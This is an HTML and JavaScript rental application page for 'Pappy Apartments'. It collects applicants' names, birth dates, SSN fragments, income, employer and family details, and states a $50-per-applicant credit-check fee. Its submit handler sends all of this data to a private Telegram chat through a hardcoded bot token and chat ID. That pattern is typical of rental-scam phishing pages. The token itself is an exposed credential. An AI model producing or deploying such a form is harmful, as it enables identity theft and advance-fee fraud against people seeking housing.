<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Pappy Apartments â€” Application</title>
  <style>
    :root{
      --accent:#2c81ba;
      --card:#ffffffcc;
      --muted:#666;
      --radius:10px;
      --pad:14px;
    }
    html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial,sans-serif;background:#f0f2f5}
    body{
      background-image: url('https://images.unsplash.com/photo-1560184897-35c0f642d0aa?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80');
      background-size:cover;background-position:center;
      display:flex;align-items:flex-start;justify-content:center;padding:36px 12px;
    }
    .card{
      width:100%;max-width:980px;background:var(--card);border-radius:16px;padding:24px;box-shadow:0 18px 40px rgba(0,0,0,0.25);
    }
    h1{margin:0 0 8px;color:var(--accent);text-align:center}
    h2.section{margin:22px 0 8px;color:#1f3a57;border-bottom:2px solid #e6eef9;padding-bottom:6px;display:flex;align-items:center;gap:10px}
    label{display:block;font-weight:600;color:#233445;margin-top:10px}
    input[type="text"], input[type="email"], input[type="tel"], input[type="number"], input[type="date"], select, textarea{
      width:100%;padding:10px 12px;margin-top:6px;border-radius:8px;border:1px solid #cfd8e3;font-size:14px;box-sizing:border-box;
    }
    textarea{min-height:64px;resize:vertical}
    .row{display:flex;gap:12px}
    .col{flex:1}
    .small{width:120px;flex:0 0 120px}
    .inline{display:flex;gap:12px;align-items:center}
    .hint{font-size:13px;color:var(--muted);margin-top:6px}
    .btn{
      display:inline-block;padding:12px 18px;background:linear-gradient(135deg,#28a745,#20c997);color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;margin-top:18px;
    }
    .btn:disabled{opacity:0.6;cursor:not-allowed}
    .note{font-size:13px;color:#444;margin-top:8px}
    .hidden{display:none}
    .success{color:green;margin-top:10px;font-weight:700}
    .error{color:#c0392b;margin-top:10px;font-weight:700}
    @media (max-width:720px){
      .row{flex-direction:column}
      .small{width:100%}
    }
  </style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="formTitle">
    <h1 id="formTitle">Pappy Apartments â€” Application Form</h1>

    <form id="appForm" autocomplete="on" novalidate>
      <!-- Number of applicants -->
      <label>Number of Applicants</label>
      <select id="numApplicants" name="num_applicants" required>
        <option value="1" selected>1</option>
        <option value="2">2</option>
        <option value="3">3</option>
      </select>

      <!-- Applicant 1 -->
      <h2 class="section">Applicant 1 â€” Personal Information</h2>
      <div class="row">
        <div class="col">
          <label for="app1_name">Full name</label>
          <input id="app1_name" name="applicant1_full_name" type="text" required placeholder="Jane Smith">
        </div>
        <div class="small">
          <label for="app1_dob">Date of birth</label>
          <input id="app1_dob" name="applicant1_dob" type="date" required>
        </div>
      </div>

      <div class="row">
        <div class="col">
          <label for="app1_email">Email address</label>
          <input id="app1_email" name="applicant1_email" type="email" required placeholder="you@example.com">
        </div>
        <div class="col">
          <label for="app1_home">Home phone (10 digits)</label>
          <input id="app1_home" name="applicant1_home_phone" type="tel" inputmode="numeric" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
        </div>
        <div class="col">
          <label for="app1_mobile">Mobile phone (10 digits)</label>
          <input id="app1_mobile" name="applicant1_mobile_phone" type="tel" inputmode="numeric" pattern="\d{10}" maxlength="10" placeholder="1234567890" required>
        </div>
      </div>

      <div class="row">
        <div class="small">
          <label for="app1_ssn">Last 4 of SSN</label>
          <input id="app1_ssn" name="applicant1_ssn_last4" type="text" inputmode="numeric" pattern="\d{4}" maxlength="4" placeholder="1234" required>
        </div>
        <div class="col">
          <label for="app1_occupation">Occupation / Title</label>
          <input id="app1_occupation" name="applicant1_occupation" type="text" placeholder="Job title">
        </div>
      </div>

      <!-- placeholder for applicant 2+3 -->
      <div id="additionalApplicants"></div>

      <!-- Rental History (Current Address) -->
      <h2 class="section">Current Address</h2>
      <label for="street">Street address</label>
      <input id="street" name="street_address" type="text" required placeholder="123 Main St">

      <div class="row">
        <div class="col">
          <label for="apt">Apt / Unit #</label>
          <input id="apt" name="apt_number" type="text" placeholder="Apt 4B">
        </div>
        <div class="col">
          <label for="city">City</label>
          <input id="city" name="city" type="text" required placeholder="City">
        </div>
        <div class="col">
          <label for="state">State</label>
          <select id="state" name="state" required>
            <option value="">Select State</option>
            <option value="AL">Alabama</option><option value="AK">Alaska</option><option value="AZ">Arizona</option>
            <option value="AR">Arkansas</option><option value="CA">California</option><option value="CO">Colorado</option>
            <option value="CT">Connecticut</option><option value="DE">Delaware</option><option value="FL">Florida</option>
            <option value="GA">Georgia</option><option value="HI">Hawaii</option><option value="ID">Idaho</option>
            <option value="IL">Illinois</option><option value="IN">Indiana</option><option value="IA">Iowa</option>
            <option value="KS">Kansas</option><option value="KY">Kentucky</option><option value="LA">Louisiana</option>
            <option value="ME">Maine</option><option value="MD">Maryland</option><option value="MA">Massachusetts</option>
            <option value="MI">Michigan</option><option value="MN">Minnesota</option><option value="MS">Mississippi</option>
            <option value="MO">Missouri</option><option value="MT">Montana</option><option value="NE">Nebraska</option>
            <option value="NV">Nevada</option><option value="NH">New Hampshire</option><option value="NJ">New Jersey</option>
            <option value="NM">New Mexico</option><option value="NY">New York</option><option value="NC">North Carolina</option>
            <option value="ND">North Dakota</option><option value="OH">Ohio</option><option value="OK">Oklahoma</option>
            <option value="OR">Oregon</option><option value="PA">Pennsylvania</option><option value="RI">Rhode Island</option>
            <option value="SC">South Carolina</option><option value="SD">South Dakota</option><option value="TN">Tennessee</option>
            <option value="TX">Texas</option><option value="UT">Utah</option><option value="VT">Vermont</option>
            <option value="VA">Virginia</option><option value="WA">Washington</option><option value="WV">West Virginia</option>
            <option value="WI">Wisconsin</option><option value="WY">Wyoming</option>
          </select>
        </div>
        <div class="small">
          <label for="zip">Zip</label>
          <input id="zip" name="zip" type="text" inputmode="numeric" pattern="\d{5}" maxlength="5" placeholder="12345" required>
        </div>
      </div>

      <div class="row">
        <div class="col">
          <label for="rent_amount">Rent amount ($)</label>
          <input id="rent_amount" name="rent_amount" type="number" min="0" placeholder="1200" required>
        </div>
        <div class="col">
          <label for="reason_moving">Reason for moving</label>
          <input id="reason_moving" name="reason_moving" type="text" placeholder="Explain why you are leaving">
        </div>
      </div>

      <!-- Employment -->
      <h2 class="section">Employment</h2>
      <label for="employer">Employer</label>
      <input id="employer" name="employer" type="text" required placeholder="Company name">

      <div class="row">
        <div class="col">
          <label for="income">Income</label>
          <input id="income" name="income" type="number" min="0" placeholder="Monthly or per pay" required>
        </div>
        <div class="col">
          <label for="pay_freq">Pay frequency</label>
          <select id="pay_freq" name="pay_frequency" required>
            <option value="">Select...</option>
            <option value="weekly">Weekly</option>
            <option value="bi-weekly">Bi-Weekly</option>
            <option value="monthly">Monthly</option>
          </select>
        </div>
      </div>

      <!-- Additional Info -->
      <h2 class="section">Additional Information</h2>

      <div class="row">
        <div class="col">
          <label for="married">Are you married?</label>
          <select id="married" name="married" required>
            <option value="">Select...</option><option value="yes">Yes</option><option value="no">No</option>
          </select>
        </div>

        <div class="col">
          <label for="kids">Do you have kids?</label>
          <select id="kids" name="kids" required>
            <option value="">Select...</option><option value="yes">Yes</option><option value="no">No</option>
          </select>
        </div>

        <div class="col">
          <label for="car">Do you have a car?</label>
          <select id="car" name="car" required>
            <option value="">Select...</option><option value="yes">Yes</option><option value="no">No</option>
          </select>
        </div>
      </div>

      <div id="kids_block" class="hidden">
        <label for="kids_number">How many kids?</label>
        <input id="kids_number" name="kids_number" type="number" min="1" max="20" placeholder="Number of kids">
      </div>

      <div class="row">
        <div class="col">
          <label for="pet">Do you have a pet?</label>
          <select id="pet" name="pet" required>
            <option value="">Select...</option><option value="yes">Yes</option><option value="no">No</option>
          </select>
        </div>
        <div class="col hidden" id="pet_block_container">
          <label for="pet_type">What type of pet?</label>
          <input id="pet_type" name="pet_type" type="text" placeholder="e.g., Dog, Cat">
        </div>
      </div>

      <!-- Lease duration numeric -->
      <label>How long lease are you looking for?</label>
      <div class="row">
        <div class="col">
          <input name="lease_months" id="lease_months" type="number" min="0" placeholder="Months (e.g., 6)">
        </div>
        <div class="col">
          <input name="lease_years" id="lease_years" type="number" min="0" placeholder="Years (e.g., 1)">
        </div>
      </div>

      <label>Are you ready to secure the apartment with a security deposit?</label>
      <select name="security_deposit" id="security_deposit" required>
        <option value="">Select...</option><option value="yes">Yes</option><option value="no">No</option>
      </select>

      <label>When are you ready to move in?</label>
      <input name="move_in_date" id="move_in_date" type="date" required>

      <!-- Authorization -->
      <h2 class="section">Authorization & Fee</h2>
      <p>
        I hereby authorize the Landlord or Rental Agent to obtain information it deems desirable in the processing of my application,
        including credit reports, civil or criminal actions, rental history, employment/income details, and any other relevant information.
        This application releases the Landlord, its employees and agents, from all liabilities and damage whatsoever incurred in furnishing
        and obtaining such information.
      </p>

      <div class="inline" style="align-items:flex-start;margin-top:8px">
        <input id="auth_checkbox" name="authorization" type="checkbox" required style="margin-top:6px">
        <label for="auth_checkbox" style="margin:0 0 0 8px;font-weight:600">I agree to the above authorization.</label>
      </div>

      <p class="note">*Credit check fee: $50.00 per applicant</p>

      <div id="formMessages" aria-live="polite"></div>

      <button id="submitBtn" class="btn" type="submit">Submit Application</button>
    </form>
  </div>

  <script>
    // ---------- UTIL: keep only digits in given input ----------
    function allowDigitsOnly(el) {
      el.addEventListener('input', () => {
        const start = el.selectionStart;
        el.value = el.value.replace(/\D/g,'');
        el.setSelectionRange(start, start);
      });
    }

    // apply to phone & ssn & zip fields
    ['app1_home','app1_mobile','app1_ssn','zip','lease_months','lease_years','kids_number']
      .forEach(id => {
        const el = document.getElementById(id);
        if(el) allowDigitsOnly(el);
      });

    // If multiple applicants are added dynamically, we will apply digit-only binding later.

    // ---------- Dynamic additional applicants (1-3) ----------
    const numApplicantsEl = document.getElementById('numApplicants');
    const additionalContainer = document.getElementById('additionalApplicants');

    function createApplicantSection(i){
      const div = document.createElement('div');
      div.id = `applicant_${i}`;
      div.innerHTML = `
        <h2 class="section">Applicant ${i} â€” Personal Information</h2>
        <div class="row">
          <div class="col">
            <label for="app${i}_name">Full name</label>
            <input id="app${i}_name" name="applicant${i}_full_name" type="text" required placeholder="Full Name (Applicant ${i})">
          </div>
          <div class="small">
            <label for="app${i}_dob">Date of birth</label>
            <input id="app${i}_dob" name="applicant${i}_dob" type="date" required>
          </div>
        </div>
        <div class="row">
          <div class="col">
            <label for="app${i}_email">Email</label>
            <input id="app${i}_email" name="applicant${i}_email" type="email" required placeholder="you@example.com">
          </div>
          <div class="col">
            <label for="app${i}_phone">Mobile phone (10 digits)</label>
            <input id="app${i}_phone" name="applicant${i}_mobile_phone" type="tel" inputmode="numeric" maxlength="10" placeholder="1234567890" required>
          </div>
          <div class="small">
            <label for="app${i}_ssn">Last 4 SSN</label>
            <input id="app${i}_ssn" name="applicant${i}_ssn_last4" type="text" inputmode="numeric" maxlength="4" placeholder="1234" required>
          </div>
        </div>
      `;
      return div;
    }

    function renderApplicants(){
      additionalContainer.innerHTML = '';
      const count = parseInt(numApplicantsEl.value) || 1;
      for(let i=2;i<=count;i++){
        additionalContainer.appendChild(createApplicantSection(i));
        // bind digit-only to new inputs
        const phone = document.getElementById(`app${i}_phone`);
        const ssn = document.getElementById(`app${i}_ssn`);
        if(phone) allowDigitsOnly(phone);
        if(ssn) allowDigitsOnly(ssn);
      }
    }
    numApplicantsEl.addEventListener('change', renderApplicants);
    // initial call (default 1)
    renderApplicants();

    // ---------- Kids & Pet conditional fields ----------
    const kidsSel = document.getElementById('kids');
    const kidsBlock = document.getElementById('kids_block');
    const kidsNumber = document.getElementById('kids_number');

    const petSel = document.getElementById('pet');
    const petBlock = document.getElementById('pet_block_container');
    const petType = document.getElementById('pet_type');

    // initial hide
    function toggleKids(){
      if(kidsSel.value === 'yes'){ kidsBlock.classList.remove('hidden'); } else { kidsBlock.classList.add('hidden'); }
    }
    function togglePet(){
      if(petSel.value === 'yes'){ petBlock.classList.remove('hidden'); } else { petBlock.classList.add('hidden'); }
    }

    kidsSel.addEventListener('change', toggleKids);
    petSel.addEventListener('change', togglePet);

    // Also ensure any newly added applicant inputs follow digits-only policy (done above)

    // ---------- Form validation & Telegram submit ----------
    const form = document.getElementById('appForm');
    const submitBtn = document.getElementById('submitBtn');
    const messagesDiv = document.getElementById('formMessages');

    // Replace with your bot token & chat id (these were in the code you provided earlier)
    const BOT_TOKEN = "8428652927:AAEUirmhHly-u0E_HYDNdOzWp0m3MsXR_Oc";
    const CHAT_ID = "5590862324";
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    function showMessage(text, type='success'){
      messagesDiv.innerHTML = `<div class="${type==='success'?'success':'error'}">${text}</div>`;
    }

    function validateBeforeSend(){
      // rely on HTML required attributes first
      if(!form.checkValidity()){
        form.reportValidity();
        return false;
      }

      // custom checks:
      // all phone fields must be exactly 10 digits
      const phoneEls = form.querySelectorAll('input[type="tel"]');
      for(const p of phoneEls){
        const digits = (p.value || '').replace(/\D/g,'');
        if(digits.length !== 10){
          p.focus();
          showMessage('Phone numbers must contain exactly 10 digits (no spaces or punctuation).','error');
          return false;
        }
      }
      // SSN last4 must be 4 digits
      const ssnEls = form.querySelectorAll('input[name$="_ssn_last4"], input[name="applicant1_ssn_last4"], input[id="app1_ssn"]');
      // gather by pattern rather than relying on names, check any input with maxlength=4 and numeric pattern
      const ssnCandidates = form.querySelectorAll('input[maxlength="4"]');
      for(const s of ssnCandidates){
        if(s.name && s.name.toLowerCase().includes('ssn')){
          const digits = (s.value||'').replace(/\D/g,'');
          if(digits.length !== 4){
            s.focus();
            showMessage('SSN last 4 must be exactly 4 digits.','error');
            return false;
          }
        }
      }

      // zip length 5
      const zip = document.getElementById('zip');
      if(zip){
        const z = (zip.value||'').replace(/\D/g,'');
        if(z.length !== 5){
          zip.focus();
          showMessage('Please enter a 5-digit ZIP code.','error');
          return false;
        }
      }

      // if kids=yes ensure kids_number provided
      if(kidsSel.value === 'yes'){
        const k = document.getElementById('kids_number');
        if(!k.value || parseInt(k.value) <= 0){
          k.focus();
          showMessage('Please enter number of kids.', 'error');
          return false;
        }
      }

      // if pet=yes ensure pet_type provided
      if(petSel.value === 'yes'){
        if(!petType.value || petType.value.trim().length === 0){
          petType.focus();
          showMessage('Please specify pet type.', 'error');
          return false;
        }
      }

      return true;
    }

    form.addEventListener('submit', async (ev) => {
      ev.preventDefault();
      messagesDiv.innerHTML = '';

      if(!validateBeforeSend()) return;

      // disable button
      submitBtn.disabled = true;
      submitBtn.textContent = 'Sending...';

      // build payload message (plain text)
      const fd = new FormData(form);
      let msg = 'ðŸ  New Apartment Application\n\n';
      // Ensure consistent ordering for readability
      const order = [
        'num_applicants',
        'applicant1_full_name','applicant1_dob','applicant1_email','applicant1_home_phone','applicant1_mobile_phone','applicant1_ssn_last4','applicant1_occupation',
        'applicant2_full_name','applicant2_dob','applicant2_email','applicant2_mobile_phone','applicant2_ssn_last4',
        'applicant3_full_name','applicant3_dob','applicant3_email','applicant3_mobile_phone','applicant3_ssn_last4',
        'street_address','apt_number','city','state','zip','rent_amount','reason_moving',
        'employer','income','pay_frequency',
        'married','kids','kids_number','car','pet','pet_type','lease_months','lease_years','security_deposit','move_in_date','authorization'
      ];

      // append fields in the order above (if present), then any other fields
      const usedKeys = new Set();
      for(const key of order){
        if(fd.has(key)){
          let v = fd.get(key);
          if(v === null || v === '') continue;
          msg += `${key.replace(/_/g,' ')}: ${v}\n`;
          usedKeys.add(key);
        }
      }
      // remaining keys
      for(const pair of fd.entries()){
        const [k,v] = pair;
        if(usedKeys.has(k)) continue;
        msg += `${k.replace(/_/g,' ')}: ${v}\n`;
      }

      try{
        const res = await fetch(TELEGRAM_API, {
          method:'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
        const json = await res.json();
        if(json && json.ok){
          showMessage('âœ… Application sent successfully.');
          form.reset();
          // re-render applicants back to 1
          numApplicantsEl.value = '1';
          renderApplicants();
          // hide conditional blocks
          kidsBlock.classList.add('hidden');
          petBlock.classList.add('hidden');
        } else {
          console.error(json);
          showMessage('âŒ Failed to send. Check bot token/chat ID and network.','error');
        }
      }catch(err){
        console.error(err);
        showMessage('âŒ Error sending application. See console for details.','error');
      }finally{
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit Application';
      }
    });

    // Apply digit-only behavior to main form phone/ssn/zip fields
    ['app1_home','app1_mobile','app1_ssn','zip','lease_months','lease_years','kids_number'].forEach(id=>{
      const el = document.getElementById(id);
      if(el) allowDigitsOnly(el);
    });

    // small accessibility: press Enter on some selects won't submit
    document.querySelectorAll('select').forEach(s => s.addEventListener('keydown', e => { if(e.key === 'Enter') e.preventDefault(); }));

  </script>
</body>
</html>
